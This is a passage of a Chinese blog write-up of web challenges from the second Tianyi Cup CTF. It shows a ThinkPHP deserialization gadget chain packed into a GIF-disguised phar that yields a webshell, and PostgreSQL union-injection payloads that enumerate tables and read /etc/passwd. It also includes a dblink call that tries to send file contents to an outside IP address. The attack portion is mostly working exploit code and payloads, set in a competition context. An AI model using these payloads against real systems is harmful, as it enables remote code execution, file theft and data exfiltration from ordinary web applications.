class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;selfRelation = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;query = <span class="keyword">new</span> Output();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;bindAttr = [<span class="string">&#x27;mb&#x27;</span>,<span class="string">&#x27;mb&#x27;</span>]; </span><br><span class="line">            <span class="keyword">$this</span>-&gt;foreignKey = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">            $o = <span class="keyword">new</span> \<span class="built_in">stdClass</span>();</span><br><span class="line">            $o-&gt;mb = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parent = $o;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;localKey = <span class="string">&#x27;mb&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $files;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line">    <span class="comment">// echo urlencode(base64_encode(serialize(new Windows())));</span></span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">&quot;123.phar&quot;</span>); <span class="comment">//后缀名必须为 phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar -&gt; setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line">    $object = <span class="keyword">new</span> Windows();</span><br><span class="line">    $phar-&gt;setMetadata($object); <span class="comment">//将自定义的 meta-data 存入 manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;a&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上传之后 请求</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index.php&#x2F;admin&#x2F;index&#x2F;listpic?dir&#x3D;phar:&#x2F;&#x2F;.&#x2F;static&#x2F;img&#x2F;person.jpg</span><br></pre></td></tr></table></figure>
+
+<p>生成的shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.php3b58a9545013e88c7186db11bb158c44.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="easy-pg"><a href="#easy-pg" class="headerlink" title="easy_pg"></a>easy_pg</h3><p>postgresql 注入 /profile</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">email&#x3D;dsadasd; password&#x3D;123&#39; union all select current_database(),&#39;123&#39;-- </span><br></pre></td></tr></table></figure>
+
+<p>查版本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password&#x3D;123&#39; union all select version(),&#39;123&#39;--</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/23/%E6%AF%94%E8%B5%9B/2021/9-23%20%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%A4%A9%E7%BF%BC%E6%9D%AF/writeup/image-20210923155324259.png" alt="image-20210923155324259"></p>
+<p>查所有表</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">password=123&#x27; union all <span class="keyword">select</span> tablename,<span class="string">&#x27;123&#x27;</span> <span class="keyword">from</span> pg_tables <span class="keyword">WHERE</span> tablename <span class="keyword">NOT</span> <span class="keyword">LIKE</span>  <span class="string">&#x27;pg%&#x27;</span> <span class="keyword">AND</span> tablename <span class="keyword">NOT</span> <span class="keyword">LIKE</span> <span class="string">&#x27;sql_%&#x27;</span> <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span><span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">password</span>=<span class="number">123</span><span class="string">&#x27; union all select relname,&#x27;</span><span class="number">123</span><span class="string">&#x27; from pg_stat_user_tables limit 1 offset 0--</span></span><br></pre></td></tr></table></figure>
+
+<p>只有一个users 查列</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password&#x3D;123&#39; union all select column_name,&#39;123&#39; from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 1 offset 3--\</span><br></pre></td></tr></table></figure>
+
+<p>有</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name, email ,password , type </span><br></pre></td></tr></table></figure>
+
+<p>查内容 没啥东西</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password&#x3D;123&#39; union all select type,&#39;123&#39; from users limit 1 offset 1--</span><br></pre></td></tr></table></figure>
+
+<p>查数据库</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=123&#x27; union all <span class="keyword">select</span> datname,<span class="string">&#x27;123&#x27;</span> <span class="keyword">from</span> pg_database <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+<p>有四个 除了i都是自带的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">postgres,i,template1,template0</span><br></pre></td></tr></table></figure>
+
+<p>列目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password&#x3D;123&#39; union all select pg_ls_dir(&#39;&#x2F;&#39;),&#39;123&#39; limit 1 offset 21--</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/23/%E6%AF%94%E8%B5%9B/2021/9-23%20%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%A4%A9%E7%BF%BC%E6%9D%AF/writeup/image-20210923164933649.png" alt="image-20210923164933649"></p>
+<p>本地模拟下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull postgres:12.8</span><br></pre></td></tr></table></figure>
+
+<p>运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm -e POSTGRES_PASSWORD=abc123 -p 5432:5432 -d postgres:12.8</span><br></pre></td></tr></table></figure>
+
+<p>进入容器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it 6eef844ac098 bash</span><br></pre></td></tr></table></figure>
+
+<p>然后执行 进入sql命令行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psql -U postgre</span><br></pre></td></tr></table></figure>
+
+<p>读取文件</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> pg_read_file(<span class="string">&#x27;/etc/passwd&#x27;</span>, <span class="number">0</span>, <span class="number">2000000</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/23/%E6%AF%94%E8%B5%9B/2021/9-23%20%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%A4%A9%E7%BF%BC%E6%9D%AF/writeup/image-20210923174406886.png" alt="image-20210923174406886"></p>
+<p>列目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select pg_ls_dir(&#39;&#x2F;&#39;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/23/%E6%AF%94%E8%B5%9B/2021/9-23%20%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%A4%A9%E7%BF%BC%E6%9D%AF/writeup/image-20210923174446591.png" alt="image-20210923174446591"></p>
+<p>多语句执行读文件1</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> temp(t <span class="built_in">TEXT</span>);</span><br><span class="line">COPY temp FROM &#x27;/etc/passwd&#x27;;</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> temp;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> temp;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/23/%E6%AF%94%E8%B5%9B/2021/9-23%20%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%A4%A9%E7%BF%BC%E6%9D%AF/writeup/image-20210923174701844.png" alt="image-20210923174701844"></p>
+<p>多语句执行读文件2</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> lo_import(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br><span class="line"><span class="keyword">SELECT</span> lo_get(<span class="number">16399</span>);</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">data</span> <span class="keyword">from</span> pg_largeobject;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/23/%E6%AF%94%E8%B5%9B/2021/9-23%20%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%A4%A9%E7%BF%BC%E6%9D%AF/writeup/image-20210923175021731.png" alt="image-20210923175021731"></p>
+<p>还有种方式 就是通过扩展来读取文件 参考：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md">https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md</a></p>
+<p>列举扩展</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> pg_extension;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/23/%E6%AF%94%E8%B5%9B/2021/9-23%20%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%A4%A9%E7%BF%BC%E6%9D%AF/writeup/image-20210923180454778.png" alt="image-20210923180454778"></p>
+<p>安装扩展 docker里的镜像so都编译好了</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> extension dblink;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/23/%E6%AF%94%E8%B5%9B/2021/9-23%20%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%A4%A9%E7%BF%BC%E6%9D%AF/writeup/image-20210923181241959.png" alt="image-20210923181241959"></p>
+<p>执行</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> dblink_connect(<span class="string">&#x27;mycoon&#x27;</span>,<span class="string">&#x27;host=121.4.124.62 user=&#x27;</span> || (<span class="keyword">SELECT</span> lo_import(<span class="string">&#x27;/etc/passwd&#x27;</span>)) || <span class="string">&#x27; password=postgres dbname=postgres&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>emmm 没成功</p>
+<p>官方writeup:</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg4NjYyMzUyNg==&amp;mid=2247484434&amp;idx=1&amp;sn=10a35b853d836175e617bd557cc31e8c&amp;chksm=cf97985bf8e0114dc206d06f890445cf9ec04b6856290995a1c424c86d2d6ce0f560d2dde000&amp;mpshare=1&amp;scene=23&amp;srcid=0925w1yAgTueibfnKObEPrj8&amp;sharer_sharetime=1632546488841&amp;sharer_shareid=f3ff82ef5e8d3ae4000264589543ce85#rd">https://mp.weixin.qq.com/s?__biz=Mzg4NjYyMzUyNg==&amp;mid=2247484434&amp;idx=1&amp;sn=10a35b853d836175e617bd557cc31e8c&amp;chksm=cf97985bf8e0114dc206d06f890445cf9ec04b6856290995a1c424c86d2d6ce0f560d2dde000&amp;mpshare=1&amp;scene=23&amp;srcid=0925w1yAgTueibfnKObEPrj8&amp;sharer_sharetime=1632546488841&amp;sharer_shareid=f3ff82ef5e8d3ae4000264589543ce85#rd</a></p>
+<p>这道题用lo_import一直500 利用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or lo_import($$&#x2F;flag$$,10000) is null --</span><br></pre></td></tr></table></figure>
+
+<p>然后在用联合查询得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select  encode(lo_get(10000),$$escape$$),NULL --</span><br></pre></td></tr></table></figure>
+
+
+          
+            <div class='article_footer'>
+              
+                
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+<section class="widget copyright  desktop mobile">
+  <div class='content'>
+    
+      <blockquote>
+        
+          
+            <p>本文永久链接是：<a href=http://www.moonback.xyz/2021/09/23/%E6%AF%94%E8%B5%9B/2021/9-23%20%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%A4%A9%E7%BF%BC%E6%9D%AF/writeup/>http://www.moonback.xyz/2021/09/23/%E6%AF%94%E8%B5%9B/2021/9-23%20%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%A4%A9%E7%BF%BC%E6%9D%AF/writeup/</a></p>
+          
+        
+      </blockquote>
+    
+  </div>
+</section>
+
+  
+
+  
+
+
+              
+            </div>
+          
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-10-03T22:29:50+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2021年10月3日</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/writeup/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>writeup</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.moonback.xyz/2021/09/23/%E6%AF%94%E8%B5%9B/2021/9-23%20%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%A4%A9%E7%BF%BC%E6%9D%AF/writeup/&title=第二届天翼杯writeup - 明月归的小站&summary=web题目writeup"
+          
+          >
+          
+            <img src="/static/images/qq.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.moonback.xyz/2021/09/23/%E6%AF%94%E8%B5%9B/2021/9-23%20%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%A4%A9%E7%BF%BC%E6%9D%AF/writeup/&title=第二届天翼杯writeup - 明月归的小站&summary=web题目writeup"
+          
+          >
+          
+            <img src="/static/images/qzone.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.moonback.xyz/2021/09/23/%E6%AF%94%E8%B5%9B/2021/9-23%20%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%A4%A9%E7%BF%BC%E6%9D%AF/writeup/&title=第二届天翼杯writeup - 明月归的小站&summary=web题目writeup"
+          
+          >
+          
+            <img src="/static/images/weibo.png">
+          
+        </a>
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </section>
+
+
+        
+        
+          <div class="prev-next">
+            
+              <a class='prev' href='/2021/09/25/%E6%AF%94%E8%B5%9B/2021/9-25%20%E9%95%BF%E5%AE%89%E6%9D%AF/writeup/'>
+                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>长安杯高校组部分题目Writeup</p>
+                <p class='content'>web题目writeup
+
+
+webezpyjwt jwtcrack爆破密码发现是CTf4r
+工具地址：https://github.com/brendan-rius/c-jwt-cracker...</p>
+              </a>
+            
+            
+              <a class='next' href='/2021/09/10/%E5%88%B7%E9%A2%98/ctftime/2021/9-10%20TMUCTF%202021/writeup/'>
+                <p class='title'>TMU CTF 2021<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+                <p class='content'>ALLES! CTF 2021
+
+
+Loginrobots.txt
+1234567if (isset($_GET[&quot;password&quot;])) &#123;    if (ha...</p>
+              </a>
+            
+          </div>
+        
+      </section>
+    </article>
+  
+
+  
+    
+
+  <article class="post white-box reveal comments shadow">
+    <section class="article typo">
+      <p ct><i class='fas fa-comments'></i> 评论</p>
+      
+      <section id="comments">
+        <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+</div>
+
+      </section>
+    </section>
+  </article>
+
+
+  
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+</div>
+<aside class='l_side'>
+  
+  
+
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jackson"><span class="toc-text">jackson</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezeval"><span class="toc-text">ezeval</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#eztp"><span class="toc-text">eztp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-pg"><span class="toc-text">easy_pg</span></a></li></ol></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+    </div>
+    
+  
+  <footer class="clearfix">
+    <br><br>
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+              <a href="/atom.xml"
+                class="social fas fa-rss flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="mailto:3300162791@qq.com"
+                class="social fas fa-envelope flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="https://github.com/BeyondOneself"
+                class="social fab fa-github flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+          
+        </div>
+      
+    
+      
+        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+      
+    
+      
+        本站使用
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0" target="_blank" class="codename">Volantis</a>
+        作为主题，总访问量为
+          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+          次
+        
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © 2019-2020</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+  </div>
+  <div>
+    
+    
+<script src="/static/js-css/jquery.min.js"></script>
+
+
+
+  <script>
+    
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/" || "/";
+    if (!ROOT.endsWith('/')) ROOT += '/';
+  </script>
+
+
+
+  <script async src="/static/js-css/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+
+
+
+  
+  
+  
+    
+<script src="/static/js-css/jquery.backstretch.min.js"></script>
+
+    <script type="text/javascript">
+      $(function(){
+        var imgs=["/static/images/1.jpg", "/static/images/2.jpg", "/static/images/3.jpg", "/static/images/4.jpg", "/static/images/5.jpg", "/static/images/6.jpg", "/static/images/7.jpg", "/static/images/8.jpg", "/static/images/9.jpg", "/static/images/10.jpg", "/static/images/11.jpg", "/static/images/12.jpg", "/static/images/13.jpg", "/static/images/14.jpg", "/static/images/15.jpg", "/static/images/16.jpg", "/static/images/17.jpg", "/static/images/18.jpg", "/static/images/19.jpg", "/static/images/20.jpg", "/static/images/21.jpg", "/static/images/22.jpg", "/static/images/23.jpg", "/static/images/24.jpg", "/static/images/25.jpg", "/static/images/26.jpg", "/static/images/27.jpg", "/static/images/28.jpg", "/static/images/29.jpg", "/static/images/30.jpg", "/static/images/31.jpg", "/static/images/32.jpg", "/static/images/33.jpg", "/static/images/34.jpg", "/static/images/35.jpg", "/static/images/36.jpg", "/static/images/37.jpg", "/static/images/38.jpg", "/static/images/39.jpg", "/static/images/40.jpg", "/static/images/41.jpg", "/static/images/42.jpg", "/static/images/43.jpg", "/static/images/44.jpg", "/static/images/45.jpg", "/static/images/46.jpg", "/static/images/47.jpg", "/static/images/48.jpg", "/static/images/49.jpg", "/static/images/50.jpg", "/static/images/51.jpg", "/static/images/52.jpg", "/static/images/53.jpg", "/static/images/54.jpg", "/static/images/55.jpg", "/static/images/56.jpg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg"];
+        if ('true' == 'true') {
+          function shuffle(arr){
+            /*From countercurrent-time*/
+            var n = arr.length;
+            while(n--) {
+              var index = Math.floor(Math.random() * n);
+              var temp = arr[index];
+              arr[index] = arr[n];
+              arr[n] = temp;
+            }
+          }
+          shuffle(imgs);
+        }
+        if ('.cover') {
+          $('.cover').backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        } else {
+          $.backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        }
+      });
+    </script>
+  
+
+
+
+
+
+
+  
+  
+<script src="/js/valine.js"></script>
+
+
+<script>
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link'.split(',').filter(function (item) {
+    return GUEST_INFO.indexOf(item) > -1
+  });
+  var REQUIRED_FIELDS = ['nick', 'mail', 'link'];
+  var requiredFields = 'nick,mail'.split(',').filter(function (item) {
+    return REQUIRED_FIELDS.indexOf(item) > -1
+  });
+
+  function emoji(path, idx, ext) {
+    return path + "/" + path + "-" + idx + "." + ext;
+  }
+
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+
+  function pjax_valine() {
+    let pageUrl = $.trim($('#pjax-comment-path').text()) === "none" ? 
+      decodeURI(window.location.pathname) : $.trim($('#pjax-comment-path').text());
+    let pagePlaceholder = $.trim($('#pjax-comment-placeholder').text()) === "none" ?
+      "快来评论吧~" : $.trim($('#pjax-comment-placeholder').text());
+
+    let ALLPATH = '';
+    if(ALLPATH != '') pageUrl = ALLPATH;
+
+    var valine = new Valine();
+    valine.init({
+      el: '#valine_container',
+      meta: meta,
+      placeholder: pagePlaceholder,
+      path: pageUrl,
+      appId: "or2NepulP8NGKXehq1IRSQTc-gzGzoHsz",
+      appKey: "lRlc11XLlqK4AeDJeNJxo17y",
+      pageSize: '10',
+      avatar: 'robohash',
+      lang: 'zh-cn',
+      visitor: 'true',
+      highlight: 'true',
+      mathJax: 'false',
+      enableQQ: 'true',
+      requiredFields: requiredFields,
+      emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+      emojiMaps: emojiMaps
+    })
+  }
+
+  $(function () {
+    pjax_valine();
+  });
+</script>
+
+
+
+
+<!-- darkmodejs -->
+
+
+<!-- 复制 -->
+
+  <script src="/static/js-css/clipboard.min.js"></script>
+<script>
+    var clipboard = new ClipboardJS('.btn-copy', {
+        target: function (trigger) {
+            return trigger.nextElementSibling
+        }
+    });
+    function wait(callback, seconds) {
+        var timelag = null;
+        timelag = window.setTimeout(callback, seconds)
+    }
+    function pjax_initCopyCode() {
+        var copyHtml = '';
+        copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+        copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
+        copyHtml += '</button>';
+        $(".highlight .code pre").before(copyHtml);
+        $(".article pre code").before(copyHtml);
+        clipboard.off('success').on('success', function (e) {
+            let $btn = $(e.trigger);
+            $btn.addClass('copied');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-check-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPIED';
+            wait(function () {
+                $icon.removeClass('fa-check-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        });
+        clipboard.off('error').on('error', function (e) {
+            e.clearSelection();
+            let $btn = $(e.trigger);
+            $btn.addClass('copy-failed');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-times-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPY FAILED';
+            wait(function () {
+                $icon.removeClass('fa-times-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        })
+    }
+    $(function () {
+        pjax_initCopyCode()
+    });
+</script>
+
+
+<!-- scrollreveal -->
+
+  <script src="/static/js-css/scrollreveal.min.js"></script>
+  <script type="text/javascript">
+    function pjax_scrollrebeal() {
+      ScrollReveal().reveal('.l_main .reveal', {
+        distance: '32px',
+        duration: '800',
+        interval: '20',
+        scale: '1',
+        easing: 'ease-out'
+      });
+    }
+
+    $(function () {
+      pjax_scrollrebeal();
+    });
+  </script>
+
+<!-- ******************************** -->
+
+<!-- fancybox -->
+<script src="/static/js-css/jquery.fancybox.min.js"></script>
+<script>
+  function pjax_fancybox() {
+    $(".article-entry").find("img").not('.inline').not('a img').each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".article-entry").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  $(function () {
+    pjax_fancybox();
+  });
+</script>
+
+<!-- ******************************** -->
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+
+  
+    
+<script src="/js/search.js"></script>
+
+  
+
+
+
+  <script defer src="/static/js-css/busuanzi.pure.mini.js" data-pjax></script>
+
+
+
+  
+<script src="/static/js-css/waves.min.js"></script>
+
+  <script type="text/javascript">
+    $(function () {
